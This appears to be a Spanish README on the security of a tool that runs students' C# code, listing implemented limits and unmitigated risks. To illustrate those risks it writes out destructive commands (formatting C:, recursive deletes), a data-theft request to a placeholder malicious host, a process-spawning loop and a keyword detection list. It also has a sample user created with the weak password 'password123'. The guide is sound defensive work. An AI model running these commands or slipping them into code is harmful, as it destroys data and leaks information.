# Seguridad al Ejecutar Código de Alumnos

## ✅ Protecciones Implementadas

### 1. **Límite de Tiempo (Timeout)**
- Protege contra: bucles infinitos
- Límite configurable en la interfaz (default: 5 segundos)

### 2. **Límite de Memoria**
- Protege contra: consumo excesivo de RAM, memory bombs
- Límite: **512 MB** por proceso
- Monitoreo cada 100ms durante la ejecución

### 3. **Prioridad Reducida del Proceso**
- Los procesos ejecutados tienen prioridad `BelowNormal`
- Minimiza el impacto en el sistema si hay uso intensivo de CPU

### 4. **Directorio de Trabajo Aislado (WorkDir)**
- Cada ejecución usa un directorio temporal separado
- Se limpia automáticamente después de ejecutar
- El código del alumno no puede acceder directamente a archivos del sistema

## ⚠️ Riesgos NO Mitigados (Recomendaciones)

### 1. **Acceso al Sistema de Archivos**
**Riesgo:** El código puede leer/escribir/eliminar archivos en cualquier ubicación.

**Ejemplo malicioso:**
```csharp
File.Delete("C:\\Windows\\System32\\importante.dll"); // ❌ PELIGROSO
Directory.Delete("C:\\Users\\Profesor\\Documentos", true); // ❌ PELIGROSO
```

**Mitigación sugerida:**
- Ejecutar en una máquina virtual o contenedor Docker
- Usar un usuario con permisos limitados
- Revisar manualmente el código antes de ejecutar

### 2. **Acceso a Red**
**Riesgo:** El código puede hacer peticiones HTTP, enviar datos, descargar malware.

**Ejemplo malicioso:**
```csharp
using var client = new HttpClient();
await client.GetAsync("http://sitio-malicioso.com/robar-datos"); // ❌ PELIGROSO
```

**Mitigación sugerida:**
- Desconectar la red durante las pruebas
- Usar firewall para bloquear acceso a red del proceso

### 3. **Ejecución de Otros Procesos**
**Riesgo:** El código puede lanzar otros programas.

**Ejemplo malicioso:**
```csharp
Process.Start("cmd.exe", "/c format C: /y"); // ❌ EXTREMADAMENTE PELIGROSO
Process.Start("powershell", "-Command Remove-Item C:\\* -Recurse"); // ❌ PELIGROSO
```

**Mitigación sugerida:**
- Ejecutar en sandbox o contenedor
- Revisar el código manualmente antes de ejecutar

### 4. **Fork Bombs**
**Riesgo:** Crear procesos infinitamente hasta colapsar el sistema.

**Ejemplo malicioso:**
```csharp
while(true) 
{
    Process.Start("notepad.exe"); // ❌ Fork bomb
}
```

**Mitigación:** Parcialmente cubierta por timeout y límite de memoria, pero puede causar problemas antes de que se detecte.

### 5. **Reflexión y Código Dinámico**
**Riesgo:** Usar reflection para ejecutar código arbitrario o acceder a APIs privadas.

**Ejemplo malicioso:**
```csharp
Assembly.Load(maliciousBytes); // ❌ Cargar DLL maliciosa
Type.GetType("System.Security.SecurityManager").GetMethod("SetSecurity")?.Invoke(...); // ❌
```

## 🛡️ Mejores Prácticas Recomendadas

### Opción 1: Máquina Virtual
- Ejecutar el validador en una VM con snapshot
- Revertir snapshot después de cada sesión de corrección
- **Ventaja:** Protección completa
- **Desventaja:** Requiere más recursos

### Opción 2: Sandbox con Windows Sandbox
```powershell
# Ejecutar en Windows Sandbox (Windows 10 Pro/Enterprise)
WindowsSandbox.exe
```

### Opción 3: Contenedor Docker
```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:8.0
WORKDIR /app
# Configurar límites de recursos
```

### Opción 4: Revisión Manual Previa
- **Revisar rápidamente** el código antes de ejecutar
- Buscar: `Process.Start`, `File.Delete`, `HttpClient`, `System.Net`
- Toma ~30 segundos por alumno

### Opción 5: Usuario con Permisos Limitados
```powershell
# Crear usuario sin privilegios para ejecutar el validador
net user ValidadorTest password123 /add
# No agregar a ningún grupo administrativo
```

## 📋 Checklist de Seguridad

Antes de usar en producción:

- [ ] ¿Estás ejecutando en una VM o máquina dedicada?
- [ ] ¿Has revisado el código de los alumnos buscando `Process.Start`, `File.Delete`, `HttpClient`?
- [ ] ¿Tienes respaldos de archivos importantes?
- [ ] ¿El validador se ejecuta con un usuario sin privilegios de administrador?
- [ ] ¿Has probado primero con tu propio código para verificar funcionamiento?

## 🔍 Señales de Código Malicioso

Busca estas palabras clave en el código de alumnos:

```
❌ Process.Start
❌ File.Delete
❌ Directory.Delete
❌ HttpClient
❌ WebClient
❌ Socket
❌ Registry
❌ Environment.Exit
❌ Assembly.Load
❌ Reflection
```

Si encuentras alguna, **revisa manualmente** antes de ejecutar.

## Conclusión

El validador tiene protecciones básicas pero **NO ES UN SANDBOX COMPLETO**. Para uso seguro en producción:

1. **Mejor opción:** Ejecutar en VM/Docker
2. **Opción práctica:** Revisar código + usuario limitado
3. **Opción mínima:** Tener respaldos + estar preparado para restaurar el sistema

**Recuerda:** Ningún sistema es 100% seguro. La combinación de múltiples capas de protección es la mejor estrategia.
